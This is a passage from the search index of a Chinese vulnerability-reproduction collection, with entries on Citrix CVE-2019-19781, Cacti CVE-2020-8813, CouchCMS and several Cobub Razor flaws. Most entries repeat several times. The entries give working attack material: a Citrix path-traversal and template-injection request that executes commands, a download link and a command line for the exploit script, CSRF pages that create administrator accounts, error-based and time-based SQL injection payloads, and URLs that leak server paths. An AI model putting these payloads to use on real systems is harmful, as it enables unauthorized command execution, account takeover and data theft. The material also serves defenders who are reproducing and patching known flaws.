\u5f00\u542f\u6765\u5bbe\u5b9e\u65f6\u56fe\u67e5\u770b\u6743\u9650\u5219\u4e0d\u9700\u8981\u8ba4\u8bc1"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cacti/CVE-2020-8813%20-%20Cacti%20v1.2.8%20RCE/#httpsshellssystemscacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813","text":"","title":"\u8be6\u7ec6\u5206\u6790\u4ee5\u53ca\u6765\u6e90:https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Citrix/Citrix%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2019-19781%EF%BC%89/","text":"Citrix \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0\uff08CVE-2019-19781\uff09 \u00b6 \u6f0f\u6d1e\u5f71\u54cd \u00b6 Citrix 13.x,12.1,12.0,11.1,10.5 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u65b9\u6cd5\u4e00\uff1a \u6784\u9020\u5982\u4e0b\u6570\u636e\u5305 POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1 Host: target-ip Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.23.0 NSC_NONCE: nsroot NSC_USER: ../../../netscaler/portal/templates/15ffbdca Content-Length: 89 url= http://example.com&title=test&desc= [% template.new('BLOCK' = 'print whoami ') %] \u8bbf\u95ee/vpn/../vpns/portal/test.xml\u5373\u53ef\u8fd4\u56de\u547d\u4ee4\u6267\u884c\u7ed3\u679c \u65b9\u6cd5\u4e8c\uff1a exp\u4e0b\u8f7d\uff1a https://codeload.github.com/jas502n/CVE-2019-19781/zip/master python CVE-2019-19781-Citrix-ADC-Remote-Code-Execution.py https://target-ip \u63d0\u793a\u4ee3\u7406\u9519\u8bef\u7684\u8bdd\uff0c\u6302\u672c\u5730\u4ee3\u7406\u5373\u53ef\u3002","title":"Citrix \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0\uff08CVE-2019-19781\uff09"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Citrix/Citrix%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2019-19781%EF%BC%89/#citrix-cve-2019-19781","text":"","title":"Citrix \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0\uff08CVE-2019-19781\uff09"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Citrix/Citrix%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2019-19781%EF%BC%89/#_1","text":"Citrix 13.x,12.1,12.0,11.1,10.5","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Citrix/Citrix%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2019-19781%EF%BC%89/#_2","text":"\u65b9\u6cd5\u4e00\uff1a \u6784\u9020\u5982\u4e0b\u6570\u636e\u5305 POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1 Host: target-ip Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.23.0 NSC_NONCE: nsroot NSC_USER: ../../../netscaler/portal/templates/15ffbdca Content-Length: 89 url= http://example.com&title=test&desc= [% template.new('BLOCK' = 'print whoami ') %] \u8bbf\u95ee/vpn/../vpns/portal/test.xml\u5373\u53ef\u8fd4\u56de\u547d\u4ee4\u6267\u884c\u7ed3\u679c \u65b9\u6cd5\u4e8c\uff1a exp\u4e0b\u8f7d\uff1a https://codeload.github.com/jas502n/CVE-2019-19781/zip/master python CVE-2019-19781-Citrix-ADC-Remote-Code-Execution.py https://target-ip \u63d0\u793a\u4ee3\u7406\u9519\u8bef\u7684\u8bdd\uff0c\u6302\u672c\u5730\u4ee3\u7406\u5373\u53ef\u3002","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.7.2%E5%AD%98%E5%9C%A8%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Cobub Razor 0.7.2\u5b58\u5728\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e 2018-03-06 Kyhvedn\uff08 yinfengwuyueyi@163.com \u3001 kyhvedn@5ecurity.cn \uff09 http://www.cobub.com/ https://github.com/cobub/razor/ 0.7.2 CVE-2018-7720 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 Cobub Razor 0.7.2\u5b58\u5728\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e\uff0c\u7ba1\u7406\u5458\u767b\u9646\u540e\u8bbf\u95ee\u7279\u5b9a\u9875\u9762\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u53f7\u3002\u4fdd\u5b58\u5982\u4e0b\u5229\u7528\u4ee3\u7801\u4e3ahtml\u9875\u9762\uff0c\u6253\u5f00\u9875\u9762\u5c06\u589e\u52a0test123/test\u7684\u7ba1\u7406\u5458\u8d26\u53f7\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 \u5229\u7528\u4ee3\u7801\u5982\u4e0b\uff1a < body > < script > alert ( document . cookie )</ script > < form action = \"http://localhost/index.php?/user/createNewUser/\" method = \"POST\" > < input type = \"hidden\" name = \"username\" value = \"test123\" /> < input type = \"hidden\" name = \"email\" value = \"test&#64;test123&#46;test\" /> < input type = \"hidden\" name = \"password\" value = \"test\" /> < input type = \"hidden\" name = \"confirm&#95;password\" value = \"test\" /> < input type = \"hidden\" name = \"userrole\" value = \"3\" /> < input type = \"hidden\" name = \"user&#47;ccreateNewUser\" value = \"\ufffd&#136;&#155;\ufffd&#187;\ufffd\" /> < input type = \"submit\" value = \"Submit request\" /> </ form > </ body > </ html >","title":"Cobub Razor 0.7.2\u5b58\u5728\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.7.2%E5%AD%98%E5%9C%A8%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Cobub Razor 0.7.2\u5b58\u5728\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e 2018-03-06 Kyhvedn\uff08 yinfengwuyueyi@163.com \u3001 kyhvedn@5ecurity.cn \uff09 http://www.cobub.com/ https://github.com/cobub/razor/ 0.7.2 CVE-2018-7720","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.7.2%E5%AD%98%E5%9C%A8%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#_2","text":"Cobub Razor 0.7.2\u5b58\u5728\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e\uff0c\u7ba1\u7406\u5458\u767b\u9646\u540e\u8bbf\u95ee\u7279\u5b9a\u9875\u9762\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u53f7\u3002\u4fdd\u5b58\u5982\u4e0b\u5229\u7528\u4ee3\u7801\u4e3ahtml\u9875\u9762\uff0c\u6253\u5f00\u9875\u9762\u5c06\u589e\u52a0test123/test\u7684\u7ba1\u7406\u5458\u8d26\u53f7\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.7.2%E5%AD%98%E5%9C%A8%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#poc","text":"\u5229\u7528\u4ee3\u7801\u5982\u4e0b\uff1a < body > < script > alert ( document . cookie )</ script > < form action = \"http://localhost/index.php?/user/createNewUser/\" method = \"POST\" > < input type = \"hidden\" name = \"username\" value = \"test123\" /> < input type = \"hidden\" name = \"email\" value = \"test&#64;test123&#46;test\" /> < input type = \"hidden\" name = \"password\" value = \"test\" /> < input type = \"hidden\" name = \"confirm&#95;password\" value = \"test\" /> < input type = \"hidden\" name = \"userrole\" value = \"3\" /> < input type = \"hidden\" name = \"user&#47;ccreateNewUser\" value = \"\ufffd&#136;&#155;\ufffd&#187;\ufffd\" /> < input type = \"submit\" value = \"Submit request\" /> </ form > </ body > </ html >","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.7.2%E8%B6%8A%E6%9D%83%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Cobub Razor 0.7.2\u8d8a\u6743\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237 2018-04-09 ppb\uff08 ppb@5ecurity.cn \uff09 https://github.com/cobub/razor/ https://github.com/cobub/razor/ 0.72 CVE-2018-7745 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 Cobub Razor 0.7.2\u8d8a\u6743\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237\u6f0f\u6d1e\uff0c\u5728\u4e0d\u767b\u5f55\u7684\u60c5\u51b5\u4e0b\u53d1\u9001\u7279\u5b9a\u6570\u636e\u5305\uff0c\u53ef\u65b0\u589e\u7ba1\u7406\u5458\u8d26\u53f7\u3002\u4fdd\u5b58\u5982\u4e0b\u5229\u7528\u4ee3\u7801\u4e3ahtml\u9875\u9762\uff0c\u6253\u5f00\u9875\u9762\u5c06\u589e\u52a0test/test123\u7684\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7 issues \u544a\u77e5\u4f5c\u8005\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 \u5229\u7528\u4ee3\u7801\u5982\u4e0b\uff1a < html > < body > < script > history . pushState ( '' , '' , '/' )</ script > < form action = \"http://127.0.0.1/index.php?/install/installation/createuserinfo\" method = \"POST\" > < input type = \"hidden\" name = \"siteurl\" value = \"http://127.0.0.1/\" /> < input type = \"hidden\" name = \"superuser\" value = \"test\" /> < input type = \"hidden\" name = \"pwd\" value = \"test123\" /> < input type = \"hidden\" name = \"verifypassword\" value = \"test123\" /> < input type = \"hidden\" name = \"email\" value = \"12@qq.com\" /> < input type = \"submit\" value = \"Submit request\" /> </ form > </ body > </ html >","title":"Cobub Razor 0.7.2\u8d8a\u6743\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.7.2%E8%B6%8A%E6%9D%83%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Cobub Razor 0.7.2\u8d8a\u6743\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237 2018-04-09 ppb\uff08 ppb@5ecurity.cn \uff09 https://github.com/cobub/razor/ https://github.com/cobub/razor/ 0.72 CVE-2018-7745","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.7.2%E8%B6%8A%E6%9D%83%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_2","text":"Cobub Razor 0.7.2\u8d8a\u6743\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237\u6f0f\u6d1e\uff0c\u5728\u4e0d\u767b\u5f55\u7684\u60c5\u51b5\u4e0b\u53d1\u9001\u7279\u5b9a\u6570\u636e\u5305\uff0c\u53ef\u65b0\u589e\u7ba1\u7406\u5458\u8d26\u53f7\u3002\u4fdd\u5b58\u5982\u4e0b\u5229\u7528\u4ee3\u7801\u4e3ahtml\u9875\u9762\uff0c\u6253\u5f00\u9875\u9762\u5c06\u589e\u52a0test/test123\u7684\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7 issues \u544a\u77e5\u4f5c\u8005\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.7.2%E8%B6%8A%E6%9D%83%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#poc","text":"\u5229\u7528\u4ee3\u7801\u5982\u4e0b\uff1a < html > < body > < script > history . pushState ( '' , '' , '/' )</ script > < form action = \"http://127.0.0.1/index.php?/install/installation/createuserinfo\" method = \"POST\" > < input type = \"hidden\" name = \"siteurl\" value = \"http://127.0.0.1/\" /> < input type = \"hidden\" name = \"superuser\" value = \"test\" /> < input type = \"hidden\" name = \"pwd\" value = \"test123\" /> < input type = \"hidden\" name = \"verifypassword\" value = \"test123\" /> < input type = \"hidden\" name = \"email\" value = \"12@qq.com\" /> < input type = \"submit\" value = \"Submit request\" /> </ form > </ body > </ html >","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Cobub Razor 0.8.0\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e 2018-04-16 Kyhvedn\uff08 yinfengwuyueyi@163.com \u3001 kyhvedn@5ecurity.cn \uff09 http://www.cobub.com/ https://github.com/cobub/razor/ 0.8.0 CVE-2018-8057 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 Cobub Razor 0.8.0\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u201c/application/controllers/manage/channel.php\u201d\u9875\u9762\u7684\u201cchannel_name\u201d\u53ca\u201cplatform\u201d\u53c2\u6570\u8fc7\u6ee4\u4e0d\u4e25\u683c\u5bfc\u81f4\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002Cobub Razor\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7 issues \u544a\u77e5\u4f5c\u8005\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 http://localhost/index.php?/manage/channel/addchannel POST data: 1.channel_name=test\" AND (SELECT 1700 FROM(SELECT COUNT(*),CONCAT(0x7171706b71,(SELECT (ELT(1700=1700,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JQon&platform=1 2.channel_name=test\" AND SLEEP(5)-- NklJ&platform=1","title":"Cobub Razor 0.8.0\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Cobub Razor 0.8.0\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e 2018-04-16 Kyhvedn\uff08 yinfengwuyueyi@163.com \u3001 kyhvedn@5ecurity.cn \uff09 http://www.cobub.com/ https://github.com/cobub/razor/ 0.8.0 CVE-2018-8057","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","text":"Cobub Razor 0.8.0\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u201c/application/controllers/manage/channel.php\u201d\u9875\u9762\u7684\u201cchannel_name\u201d\u53ca\u201cplatform\u201d\u53c2\u6570\u8fc7\u6ee4\u4e0d\u4e25\u683c\u5bfc\u81f4\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002Cobub Razor\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7 issues \u544a\u77e5\u4f5c\u8005\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"http://localhost/index.php?/manage/channel/addchannel POST data: 1.channel_name=test\" AND (SELECT 1700 FROM(SELECT COUNT(*),CONCAT(0x7171706b71,(SELECT (ELT(1700=1700,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JQon&platform=1 2.channel_name=test\" AND SLEEP(5)-- NklJ&platform=1","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Cobub Razor 0.8.0\u5b58\u5728\u7269\u7406\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e 2018-04-20 Kyhvedn\uff08 yinfengwuyueyi@163.com \u3001 kyhvedn@5ecurity.cn \uff09 http://www.cobub.com/ https://github.com/cobub/razor/ 0.8.0 CVE-2018-8056 / CVE-2018-8770 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 Cobub Razor 0.8.0\u5b58\u5728\u7269\u7406\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e\uff0c\u5f53\u8bbf\u95ee\u7279\u5b9aurl\u65f6\uff0c\u7cfb\u7edf\u4f1a\u663e\u793a\u7269\u7406\u8def\u5f84\u4fe1\u606f\u3002Cobub Razor\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7 issues \u544a\u77e5\u4f5c\u8005\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 \u65b9\u6cd5\u4e00\uff1a URL: http://localhost/export.php HTTP Method: GET URL: http://localhost/index.php?/manage/channel/addchannel HTTP Method: POST Data: channel_name=test\"&platform=1 \u65b9\u6cd5\u4e8c\uff1a Cobub Razor 0.8.0\u5b58\u5728\u7269\u7406\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e\uff0c\u5f53\u8bbf\u95ee\u7279\u5b9aurl\u65f6\uff0c\u7cfb\u7edf\u4f1a\u663e\u793a\u7269\u7406\u8def\u5f84\u4fe1\u606f\u3002Cobub Razor\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684\u7cfb\u7edf\u3002 HTTP Method: GET http://localhost/tests/generate.php http://localhost/tests/controllers/getConfigTest.php http://localhost/tests/controllers/getUpdateTest.php http://localhost/tests/controllers/postclientdataTest.php http://localhost/tests/controllers/posterrorTest.php http://localhost/tests/controllers/posteventTest.php http://localhost/tests/controllers/posttagTest.php http://localhost/tests/controllers/postusinglogTest.php http://localhost/tests/fixtures/Controller_fixt.php http://localhost/tests/fixtures/Controller_fixt2.php http://localhost/tests/fixtures/view_fixt2.php http://localhost/tests/libs/ipTest.php http://localhost/tests/models/commonDbfix.php","title":"Cobub Razor 0.8.0\u5b58\u5728\u7269\u7406\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Cobub Razor 0.8.0\u5b58\u5728\u7269\u7406\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e 2018-04-20 Kyhvedn\uff08 yinfengwuyueyi@163.com \u3001 kyhvedn@5ecurity.cn \uff09 http://www.cobub.com/ https://github.com/cobub/razor/ 0.8.0 CVE-2018-8056 / CVE-2018-8770","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_2","text":"Cobub Razor 0.8.0\u5b58\u5728\u7269\u7406\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e\uff0c\u5f53\u8bbf\u95ee\u7279\u5b9aurl\u65f6\uff0c\u7cfb\u7edf\u4f1a\u663e\u793a\u7269\u7406\u8def\u5f84\u4fe1\u606f\u3002Cobub Razor\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7 issues \u544a\u77e5\u4f5c\u8005\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Cobub%20Razor%200.8.0%E5%AD%98%E5%9C%A8%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#poc","text":"\u65b9\u6cd5\u4e00\uff1a URL: http://localhost/export.php HTTP Method: GET URL: http://localhost/index.php?/manage/channel/addchannel HTTP Method: POST Data: channel_name=test\"&platform=1 \u65b9\u6cd5\u4e8c\uff1a Cobub Razor 0.8.0\u5b58\u5728\u7269\u7406\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e\uff0c\u5f53\u8bbf\u95ee\u7279\u5b9aurl\u65f6\uff0c\u7cfb\u7edf\u4f1a\u663e\u793a\u7269\u7406\u8def\u5f84\u4fe1\u606f\u3002Cobub Razor\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684\u7cfb\u7edf\u3002 HTTP Method: GET http://localhost/tests/generate.php http://localhost/tests/controllers/getConfigTest.php http://localhost/tests/controllers/getUpdateTest.php http://localhost/tests/controllers/postclientdataTest.php http://localhost/tests/controllers/posterrorTest.php http://localhost/tests/controllers/posteventTest.php http://localhost/tests/controllers/posttagTest.php http://localhost/tests/controllers/postusinglogTest.php http://localhost/tests/fixtures/Controller_fixt.php http://localhost/tests/fixtures/Controller_fixt2.php http://localhost/tests/fixtures/view_fixt2.php http://localhost/tests/libs/ipTest.php http://localhost/tests/models/commonDbfix.php","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Couch%20through%202.0%E5%AD%98%E5%9C%A8%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Couch through 2.0\u5b58\u5728\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e 2018-03-04 zzw ( zzw@5ecurity.cn ) https://github.com/CouchCMS/CouchCMS/ https://github.com/CouchCMS/CouchCMS/ 2.0 CVE-2018-7662 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 Couch through 2.0\u5b58\u5728\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e\uff0c\u5f53\u8bbf\u95ee\u7279\u5b9aurl\u65f6\u7cfb\u7edf\u8fd4\u56de\u7684\u62a5\u9519\u4fe1\u606f\u4e2d\u66b4\u9732\u7269\u7406\u8def\u5f84\u4fe1\u606f\u3002Couch through\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7 issues \u544a\u77e5\u4f5c\u8005\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 \u8bbf\u95ee\u5982\u4e0b\u9875\u9762\uff0c\u62a5\u9519\u4fe1\u606f\u4e2d\u663e\u793a\u5b8c\u6574\u7269\u7406\u8def\u5f84\u4fe1\u606f\u3002 Location: includes/mysql2i/mysql2i.func.php addons/phpmailer/phpmailer.php","title":"Couch through 